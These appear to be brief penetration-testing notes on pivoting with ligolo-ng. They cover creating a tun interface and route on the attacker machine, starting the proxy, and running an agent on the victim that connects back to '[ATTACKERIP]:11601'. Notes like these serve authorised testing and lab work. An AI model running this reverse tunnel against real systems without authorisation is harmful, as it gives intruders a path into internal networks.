# Attacker machine
## Create new tun interface:
```bash
sudo ip tuntap add user kali mode tun ligolo
```
```bash
sudo ip link set ligolo up
```
```bash
ip a show
```
```bash
sudo ip route add $(IP_ADDRESS)/24 dev ligolo
```
i.e.
```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```
Can create self signed certs with -selfcert but -autocert should be used as we have internet access.

Use proxy from this machine:
```bash
ligolo-proxy -selfcert/-autocert
```
When the connection is receieved:
```
session
```
```
1
```
```
start
```
# Victim machine
```
./agent -connect [ATTACKERIP]:11601
```
